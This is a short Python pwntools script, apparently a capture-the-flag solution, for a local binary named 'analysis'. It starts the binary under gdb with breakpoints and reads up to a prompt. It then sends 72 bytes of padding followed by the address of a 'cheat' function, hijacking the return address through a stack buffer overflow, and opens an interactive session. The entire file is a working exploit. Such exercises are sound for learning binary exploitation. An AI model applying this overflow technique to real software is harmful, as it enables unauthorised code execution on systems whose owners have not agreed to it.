from pwn import *

context.arch='amd64'
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

p = gdb.debug("./analysis" , """
             b *main
             b *cheat+5
             c
              """)


libc = ELF(LIBC, checksec=False)
elf = ELF("./analysis", checksec=False)

welcome_message = p.recvuntil(b"What do you think about that wonderful number?")

print(f"cheat symbol address {hex(elf.sym.cheat)}")
p.sendline(b"A" * (64 + 8) + p64(elf.sym.cheat + 5))
p.interactive()
